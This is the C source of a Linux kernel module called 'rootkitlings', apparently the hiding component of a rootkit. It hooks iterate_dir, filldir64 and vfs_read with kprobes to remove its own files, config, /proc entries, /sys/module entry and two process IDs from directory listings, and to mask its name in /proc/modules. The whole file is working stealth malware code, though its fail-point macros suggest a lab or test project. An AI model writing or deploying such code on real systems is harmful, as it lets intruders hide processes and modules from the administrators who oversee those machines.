// SPDX-License-Identifier: GPL-2.0
#include <linux/atomic.h>
#include <linux/build_bug.h>
#include <linux/dirent.h>
#include <linux/errno.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/magic.h>
#include <linux/pid.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/slab.h>
#include <linux/stddef.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#include "dirent_filter.h"
#include "replace.h"
#include "rootkit.h"
#include "visibility.h"

#define RK_MISSING_ITERATE_TARGET \
	"__rootkitlings_missing_iterate_dir_target_7_2__"
#define RK_MISSING_READ_TARGET \
	"__rootkitlings_missing_vfs_read_target_7_2__"
#define RK_FAIL_VISIBILITY_READ_PROBE 15
#define RK_MODULE_NAME "rootkitlings"
#define RK_MODULE_MASK "------------"

static_assert(sizeof(RK_MODULE_NAME) == sizeof(RK_MODULE_MASK));

/* Exact private layout used by Linux v7.2 fs/readdir.c. */
struct rk_getdents_callback64 {
	struct dir_context ctx;
	struct linux_dirent64 __user *current_dir;
	int prev_reclen;
	int error;
};

static_assert(sizeof(struct dir_context) == 24);
static_assert(offsetof(struct rk_getdents_callback64, ctx) == 0);
static_assert(offsetof(struct rk_getdents_callback64, current_dir) == 24);
static_assert(offsetof(struct rk_getdents_callback64, prev_reclen) == 32);
static_assert(offsetof(struct rk_getdents_callback64, error) == 36);
static_assert(sizeof(struct rk_getdents_callback64) == 40);

enum rk_directory_kind {
	RK_DIRECTORY_NONE,
	RK_DIRECTORY_PROC,
	RK_DIRECTORY_MODULE_FILE,
	RK_DIRECTORY_LOAD_REQUEST,
	RK_DIRECTORY_SYS_MODULE,
};

struct rk_directory_target {
	const char *path;
	enum rk_directory_kind kind;
	struct inode *inode;
};

struct rk_directory_match {
	enum rk_directory_kind kind;
	char worker[RK_PID_TEXT_CAPACITY];
	size_t worker_length;
	char agent[RK_PID_TEXT_CAPACITY];
	size_t agent_length;
};

struct rk_directory_instance {
	struct rk_getdents_callback64 *callback;
	struct linux_dirent64 __user *entries;
	void *scratch;
	size_t capacity;
	struct rk_directory_match match;
};

struct rk_read_instance {
	char __user *buffer;
	unsigned char *scratch;
	size_t capacity;
};

static_assert(sizeof(struct rk_directory_instance) <=
	      KRETPROBE_MAX_DATA_SIZE);
static_assert(sizeof(struct rk_read_instance) <= KRETPROBE_MAX_DATA_SIZE);

static struct rk_directory_target directory_targets[] = {
	{
		.path = "/rootkitlings",
		.kind = RK_DIRECTORY_MODULE_FILE,
	},
	{
		.path = "/etc/modules-load.d",
		.kind = RK_DIRECTORY_LOAD_REQUEST,
	},
	{
		.path = "/sys/module",
		.kind = RK_DIRECTORY_SYS_MODULE,
	},
};

static const char *const proc_names[] = {
	"rootkitlings",
	"rootkitlings_events",
	"rootkitlings_evidence",
	"rootkitlings_agent",
};

static const char *const module_file_names[] = {
	"rootkitlings.ko",
};

static const char *const load_request_names[] = {
	"rootkitlings.conf",
	".rootkitlings.conf.rootkitlings",
};

static const char *const sys_module_names[] = {
	RK_MODULE_NAME,
};

static struct rk_state *visibility_state;
static struct pid *worker_pid;
static struct pid *agent_pid;
static struct inode *modules_inode;
static bool filldir_registered;
static bool directory_registered;
static bool read_registered;
static atomic_long_t directory_changes = ATOMIC_LONG_INIT(0);
static atomic_long_t directory_oversize = ATOMIC_LONG_INIT(0);
static atomic_long_t directory_copy_failures = ATOMIC_LONG_INIT(0);
static atomic_long_t read_redactions = ATOMIC_LONG_INIT(0);
static atomic_long_t read_oversize = ATOMIC_LONG_INIT(0);
static atomic_long_t read_copy_failures = ATOMIC_LONG_INIT(0);

static int rk_filldir_identity_pre(struct kprobe *probe,
				   struct pt_regs *registers)
{
	return 0;
}

static struct kprobe filldir_identity = {
	.symbol_name = "filldir64",
	.pre_handler = rk_filldir_identity_pre,
};

static filldir_t rk_filldir64_actor(void)
{
#ifdef CONFIG_X86_KERNEL_IBT
	return (filldir_t)((unsigned long)filldir_identity.addr - 4);
#else
	return (filldir_t)filldir_identity.addr;
#endif
}

static bool rk_file_is_proc_root(const struct file *file)
{
	const struct path *path;

	if (!file)
		return false;
	path = &file->f_path;
	return file_inode(file)->i_sb->s_magic == PROC_SUPER_MAGIC &&
	       path->dentry == path->dentry->d_sb->s_root;
}

static enum rk_directory_kind rk_directory_kind(const struct file *file)
{
	size_t index;

	if (rk_file_is_proc_root(file))
		return RK_DIRECTORY_PROC;
	if (!file)
		return RK_DIRECTORY_NONE;
	for (index = 0; index < ARRAY_SIZE(directory_targets); index++) {
		if (file_inode(file) == directory_targets[index].inode)
			return directory_targets[index].kind;
	}
	return RK_DIRECTORY_NONE;
}

static bool rk_name_in(const char *name, size_t length,
		       const char *const *names, size_t count)
{
	size_t index;

	for (index = 0; index < count; index++) {
		if (strlen(names[index]) == length &&
		    memcmp(name, names[index], length) == 0)
			return true;
	}
	return false;
}

static bool rk_directory_matches(const char *name, size_t length,
				 const void *context)
{
	const struct rk_directory_match *match = context;

	switch (match->kind) {
	case RK_DIRECTORY_PROC:
		if (rk_name_in(name, length, proc_names,
			       ARRAY_SIZE(proc_names)))
			return true;
		if (match->worker_length == length &&
		    memcmp(name, match->worker, length) == 0)
			return true;
		return match->agent_length == length &&
		       memcmp(name, match->agent, length) == 0;
	case RK_DIRECTORY_MODULE_FILE:
		return rk_name_in(name, length, module_file_names,
				  ARRAY_SIZE(module_file_names));
	case RK_DIRECTORY_LOAD_REQUEST:
		return rk_name_in(name, length, load_request_names,
				  ARRAY_SIZE(load_request_names));
	case RK_DIRECTORY_SYS_MODULE:
		return rk_name_in(name, length, sys_module_names,
				  ARRAY_SIZE(sys_module_names));
	default:
		return false;
	}
}

static void rk_set_pid_names(struct rk_directory_match *match,
			     const struct file *file)
{
	struct pid_namespace *namespace;
	pid_t number;

	if (match->kind != RK_DIRECTORY_PROC)
		return;
	namespace = proc_pid_ns(file_inode(file)->i_sb);
	number = pid_nr_ns(worker_pid, namespace);
	if (number > 0)
		match->worker_length = scnprintf(
			match->worker, sizeof(match->worker), "%d", number);
	number = pid_nr_ns(agent_pid, namespace);
	if (number > 0)
		match->agent_length = scnprintf(
			match->agent, sizeof(match->agent), "%d", number);
}

static int rk_directory_entry(struct kretprobe_instance *instance,
			      struct pt_regs *registers)
{
	struct rk_directory_instance *view = (void *)instance->data;
	struct rk_getdents_callback64 *callback;
	struct dir_context *context;
	struct file *file;
	size_t capacity;

	memset(view, 0, sizeof(*view));
	if (!rk_state_actions_enabled(visibility_state))
		return 1;
	file = (struct file *)regs_get_kernel_argument(registers, 0);
	context = (struct dir_context *)regs_get_kernel_argument(registers, 1);
	view->match.kind = rk_directory_kind(file);
	if (view->match.kind == RK_DIRECTORY_NONE || !context ||
	    context->actor != rk_filldir64_actor())
		return 1;
	capacity = context->count;
	if (!capacity || capacity > RK_VISIBILITY_DIRECTORY_LIMIT) {
		atomic_long_inc(&directory_oversize);
		return 1;
	}
	callback = container_of(context, struct rk_getdents_callback64, ctx);
	if (!callback->current_dir)
		return 1;
	view->scratch = kmalloc(capacity, GFP_ATOMIC);
	if (!view->scratch)
		return 1;
	rk_set_pid_names(&view->match, file);
	view->callback = callback;
	view->entries = callback->current_dir;
	view->capacity = capacity;
	return 0;
}

static unsigned short rk_last_record_length(const void *buffer, size_t length)
{
	const unsigned char *bytes = buffer;
	size_t offset = 0;
	unsigned short record_length = 0;

	while (offset < length) {
		memcpy(&record_length,
		       bytes + offset +
		       offsetof(struct linux_dirent64, d_reclen),
		       sizeof(record_length));
		offset += record_length;
	}
	return record_length;
}

static bool rk_directory_result_valid(
	const struct rk_getdents_callback64 *callback, const void *buffer,
	size_t capacity, size_t produced)
{
	const unsigned char *bytes = buffer;
	unsigned short record_length;
	size_t previous_length;

	if (callback->ctx.count < 0 ||
	    (size_t)callback->ctx.count != capacity - produced ||
	    callback->prev_reclen <= 0)
		return false;
	previous_length = (size_t)callback->prev_reclen;
	if (previous_length > produced ||
	    previous_length < offsetof(struct linux_dirent64, d_name) + 1)
		return false;
	memcpy(&record_length,
	       bytes + produced - previous_length +
	       offsetof(struct linux_dirent64, d_reclen),
	       sizeof(record_length));
	return record_length == previous_length;
}

static int rk_directory_return(struct kretprobe_instance *instance,
			       struct pt_regs *registers)
{
	struct rk_directory_instance *view = (void *)instance->data;
	struct rk_getdents_callback64 *callback = view->callback;
	const unsigned long start = (unsigned long)view->entries;
	const unsigned long end = (unsigned long)callback->current_dir;
	enum rk_dirent_filter_result result;
	unsigned short last_length;
	size_t output_length;
	size_t produced;
	size_t removed;

	if ((long)regs_return_value(registers) < 0 || end < start)
		goto out;
	produced = end - start;
	if (!produced || produced > view->capacity)
		goto out;
	if (copy_from_user_nofault(view->scratch, view->entries, produced))
		goto out;
	if (!rk_directory_result_valid(callback, view->scratch,
				       view->capacity, produced))
		goto out;
	result = rk_filter_dirents64_if(
		view->scratch, produced, rk_directory_matches, &view->match,
		&output_length);
	if (result != RK_DIRENT_FILTER_CHANGED)
		goto out;
	last_length = rk_last_record_length(view->scratch, output_length);
	if (copy_to_user_nofault(view->entries, view->scratch,
				 output_length)) {
		atomic_long_inc(&directory_copy_failures);
		callback->prev_reclen = 0;
		callback->error = -EFAULT;
		regs_set_return_value(registers, -EFAULT);
		goto out;
	}
	removed = produced - output_length;
	callback->current_dir = (void __user *)
		((unsigned long)view->entries + output_length);
	callback->prev_reclen = last_length;
	callback->ctx.count += removed;
	atomic_long_inc(&directory_changes);
out:
	kfree(view->scratch);
	view->scratch = NULL;
	return 0;
}

static struct kretprobe directory_probe = {
#if ROOTKITLINGS_FAIL_POINT == RK_FAIL_ITERATE_PROBE
	.kp.symbol_name = RK_MISSING_ITERATE_TARGET,
#else
	.kp.symbol_name = "iterate_dir",
#endif
	.entry_handler = rk_directory_entry,
	.handler = rk_directory_return,
	.data_size = sizeof(struct rk_directory_instance),
	.maxactive = RK_VISIBILITY_DIRECTORY_CAPACITY,
};

static int rk_read_entry(struct kretprobe_instance *instance,
			 struct pt_regs *registers)
{
	struct rk_read_instance *view = (void *)instance->data;
	struct file *file;
	size_t capacity;

	memset(view, 0, sizeof(*view));
	if (!rk_state_actions_enabled(visibility_state))
		return 1;
	file = (struct file *)regs_get_kernel_argument(registers, 0);
	if (!file || file_inode(file) != READ_ONCE(modules_inode))
		return 1;
	capacity = regs_get_kernel_argument(registers, 2);
	if (!capacity || capacity > RK_VISIBILITY_READ_LIMIT) {
		if (capacity)
			atomic_long_inc(&read_oversize);
		return 1;
	}
	view->buffer = (char __user *)regs_get_kernel_argument(registers, 1);
	if (!view->buffer)
		return 1;
	view->scratch = kmalloc(capacity, GFP_ATOMIC);
	if (!view->scratch)
		return 1;
	view->capacity = capacity;
	return 0;
}

static int rk_read_return(struct kretprobe_instance *instance,
			  struct pt_regs *registers)
{
	struct rk_read_instance *view = (void *)instance->data;
	const long result = (long)regs_return_value(registers);
	size_t count;

	if (result <= 0)
		goto out;
	if (result > view->capacity) {
		atomic_long_inc(&read_oversize);
		goto out;
	}
	if (copy_from_user_nofault(view->scratch, view->buffer, result)) {
		atomic_long_inc(&read_copy_failures);
		regs_set_return_value(registers, -EFAULT);
		goto out;
	}
	count = rk_replace_equal(
		view->scratch, result, (const unsigned char *)RK_MODULE_NAME,
		(const unsigned char *)RK_MODULE_MASK,
		sizeof(RK_MODULE_NAME) - 1U);
	if (!count)
		goto out;
	if (copy_to_user_nofault(view->buffer, view->scratch, result)) {
		atomic_long_inc(&read_copy_failures);
		regs_set_return_value(registers, -EFAULT);
		goto out;
	}
	atomic_long_add(count, &read_redactions);
out:
	kfree(view->scratch);
	view->scratch = NULL;
	return 0;
}

static struct kretprobe read_probe = {
#if ROOTKITLINGS_FAIL_POINT == RK_FAIL_VISIBILITY_READ_PROBE
	.kp.symbol_name = RK_MISSING_READ_TARGET,
#else
	.kp.symbol_name = "vfs_read",
#endif
	.entry_handler = rk_read_entry,
	.handler = rk_read_return,
	.data_size = sizeof(struct rk_read_instance),
	.maxactive = RK_VISIBILITY_READ_CAPACITY,
};

static int rk_retain_inode(const char *path, int flags, struct inode **target)
{
	struct file *file;
	struct inode *inode;

	file = filp_open(path, flags, 0);
	if (IS_ERR(file))
		return PTR_ERR(file);
	inode = igrab(file_inode(file));
	fput(file);
	if (!inode)
		return -ENOENT;
	*target = inode;
	return 0;
}

static void rk_release_targets(void)
{
	size_t index;

	if (modules_inode) {
		iput(modules_inode);
		modules_inode = NULL;
	}
	for (index = 0; index < ARRAY_SIZE(directory_targets); index++) {
		if (directory_targets[index].inode) {
			iput(directory_targets[index].inode);
			directory_targets[index].inode = NULL;
		}
	}
	put_pid(agent_pid);
	put_pid(worker_pid);
	agent_pid = NULL;
	worker_pid = NULL;
}

static void rk_reset_counters(void)
{
	atomic_long_set(&directory_changes, 0);
	atomic_long_set(&directory_oversize, 0);
	atomic_long_set(&directory_copy_failures, 0);
	atomic_long_set(&read_redactions, 0);
	atomic_long_set(&read_oversize, 0);
	atomic_long_set(&read_copy_failures, 0);
}

int rk_visibility_start(struct rk_state *state, struct task_struct *agent_task)
{
	size_t index;
	int error;

	if (visibility_state)
		return -EBUSY;
	if (!state || !agent_task)
		return -EINVAL;
	worker_pid = rk_worker_get_tgid();
	if (!worker_pid)
		return -ESRCH;
	agent_pid = get_task_pid(agent_task, PIDTYPE_TGID);
	if (!agent_pid) {
		error = -ESRCH;
		goto release;
	}
	for (index = 0; index < ARRAY_SIZE(directory_targets); index++) {
		error = rk_retain_inode(directory_targets[index].path,
					O_RDONLY | O_DIRECTORY,
					&directory_targets[index].inode);
		if (error)
			goto release;
	}
	error = rk_retain_inode("/proc/modules", O_RDONLY, &modules_inode);
	if (error)
		goto release;

	rk_reset_counters();
	visibility_state = state;
	error = register_kprobe(&filldir_identity);
	if (error)
		goto clear_state;
	filldir_registered = true;
	error = register_kretprobe(&directory_probe);
	if (error)
		goto unregister_filldir;
	directory_registered = true;
	error = register_kretprobe(&read_probe);
	if (error)
		goto unregister_directory;
	read_registered = true;
	return 0;

unregister_directory:
	unregister_kretprobe(&directory_probe);
	directory_registered = false;
unregister_filldir:
	unregister_kprobe(&filldir_identity);
	filldir_registered = false;
clear_state:
	visibility_state = NULL;
release:
	rk_release_targets();
	return error;
}

void rk_visibility_stop(void)
{
	if (!visibility_state)
		return;
	if (read_registered) {
		unregister_kretprobe(&read_probe);
		read_registered = false;
	}
	if (directory_registered) {
		unregister_kretprobe(&directory_probe);
		directory_registered = false;
	}
	if (filldir_registered) {
		unregister_kprobe(&filldir_identity);
		filldir_registered = false;
	}
	visibility_state = NULL;
	rk_release_targets();
}

void rk_visibility_snapshot(struct pid_namespace *namespace,
			    struct rk_visibility_snapshot *snapshot)
{
	if (!snapshot)
		return;
	memset(snapshot, 0, sizeof(*snapshot));
	if (worker_pid)
		snapshot->worker_pid = pid_nr_ns(worker_pid, namespace);
	if (agent_pid)
		snapshot->agent_pid = pid_nr_ns(agent_pid, namespace);
	snapshot->directory_changes = atomic_long_read(&directory_changes);
	snapshot->directory_oversize = atomic_long_read(&directory_oversize);
	snapshot->directory_copy_failures =
		atomic_long_read(&directory_copy_failures);
	snapshot->read_redactions = atomic_long_read(&read_redactions);
	snapshot->read_oversize = atomic_long_read(&read_oversize);
	snapshot->read_copy_failures = atomic_long_read(&read_copy_failures);
	snapshot->directory_returns_missed =
		(unsigned int)READ_ONCE(directory_probe.nmissed);
	snapshot->read_returns_missed =
		(unsigned int)READ_ONCE(read_probe.nmissed);
}
